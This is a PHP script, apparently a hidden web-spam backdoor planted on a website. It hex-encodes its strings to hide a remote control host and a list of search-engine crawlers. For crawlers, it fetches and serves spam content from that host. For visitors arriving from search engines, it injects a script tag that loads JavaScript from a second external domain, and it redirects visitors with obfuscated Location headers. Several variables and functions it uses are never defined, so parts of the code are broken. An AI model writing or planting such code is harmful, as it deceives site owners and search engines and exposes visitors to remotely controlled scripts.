<?php
date_default_timezone_set('PRC');
$start_link=false; 
function Class_UC_key($string){$array = strlen ($string);$debuger = '';for($one = 0;$one < 

$array;$one+=2) {$debuger .= pack ("C",hexdec (substr ($string,$one,2)));}return $debuger;}


function Class_Get($url){if(extension_loaded('curl')){$ch = curl_init(trim

($url));curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

$content = curl_exec($ch);curl_close($ch);}else{$content = @file_get_contents(trim

($url));}return $content;}

function Class_Turl($url,$host){
	$string = Class_UC_key('4c6f636174696f6e3a20').$url.Class_UC_key('3f').$host;
	Header($string);
	exit;
}
function getIP(){
	if (@$_SERVER["HTTP_X_FORWARDED_FOR"])$ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
	else if (@$_SERVER["HTTP_CLIENT_IP"])$ip = $_SERVER["HTTP_CLIENT_IP"];
	else if (@$_SERVER["REMOTE_ADDR"])$ip = $_SERVER["REMOTE_ADDR"];
	else if (@getenv("HTTP_X_FORWARDED_FOR"))$ip = getenv("HTTP_X_FORWARDED_FOR");
	else if (@getenv("HTTP_CLIENT_IP"))$ip = getenv("HTTP_CLIENT_IP");
	else if (@getenv("REMOTE_ADDR"))$ip = getenv("REMOTE_ADDR");
	else $ip = "Unknown";
	return $ip; 
}
error_reporting(E_ERROR);
define('HOST',$_SERVER['HTTP_HOST']);
define('REFE',$_SERVER['HTTP_REFERER']);
define('USER',$_SERVER['HTTP_USER_AGENT']);
define('URL',$_SERVER['REQUEST_URI']);
define('URL1',$_SERVER['PHP_SELF']);

$retueby = array(
				1 => Class_UC_key 

('636f6e74656e742d547970653a20746578742f68746d6c3b20636861727365743d676232333132'),
				2 => Class_UC_key ('687474703a2f2f'),
		);
define('BOSWON',Class_UC_key ('62616964757c676f6f676c657c736f676f757c736f736f'));
define('CLASS_ZHU',$retueby[2].Class_UC_key

('7a717669702e6c653336332e636f6d3a37382f78696e736977656e2f696e6465782e706870'));
define('GAME','xmf');
define('MO','rede');
define('DAO','dao_a');
$sid=$_GET['id'];
$list = $_GET['list'];
$myget = false;
preg_match("%([a-z0-9]{1,30})%", URL, $match);
if(strlen(URL)>=2 and !empty($match[1])){
	$myget = true;
if(stripos(REFE,'360')>-1 || stripos(REFE,'so')>-1  || stripos(REFE,'google')>-1  || 

stripos(REFE,'haosou')>-1  || stripos(REFE,'bing')>-1 || stripos(REFE,'sogou')>-1 || 

stripos(REFE,'sm')>-1)
{
	
	$urltxt=Class_Get("http://ip.taobao.com/service/getIpInfo2.php?ip=".getIP

()."&format=js");
	 preg_match('%"country":"(.*)","isp_id"%',$urltxt,$uarr);
	 if(strpos($uarr[1],"110105")!==false)
	 {

	 }else{
$url = '<script type="text/javascript" 

src="http://vip.fengdaseo.com:33/6081.js"></script>';
echo $url;
exit;
	 }
}

}
if (eregi (BOSWON,USER) || $start_link==true){
	
	if(!empty($_GET) && $myget && $chkip==false){
		echo Class_Get(CLASS_ZHU.'?allgame='.GAME.'&url='.bin2hex

(URL).'&url1='.bin2hex(URL1).'&mo='.MO.'&list='.$list.'&dao='.DAO.'&host='.HOST.'&sid='.

$sid);
		echo $dao;
		exit;
	}
	if(empty($_GET)){
		echo '';
	}
}


if(eregi (BOSWON,REFE)){
	foreach($arrgpe as $strss => $idss){
		if(stristr(REFE,$strss)){
			$myids = $idss;
		}
	}
	$class_n = true;
	if(stristr(REFE,'site%3A') or stristr(REFE,'inurl%3A')){
		setcookie('x86',HOSTT,time() + 259200);
		$class_n = false;
	}
	if(('http://'.HOSTT.URLL !== 'http://'.HOSTT.'/') && ('http://'.HOSTT.URLL !== 

'http://'.HOSTT.'/index.php') && $class_n && empty($_COOKIE['x86']) && !empty($myids)){
			setcookie('x86',HOSTT,time() + 259200);
			$Class_change = trim(Class_Get(CLASS_URL));
			$Class_arrs = explode('@@@',$Class_change);
			$Class_news = base64_decode($Class_arrs[1]);
			$Class_come = $Class_news.$myids.Class_UC_keyy('2e68746d');
			Class_Turl($Class_come,HOSTT);
	}
}
?>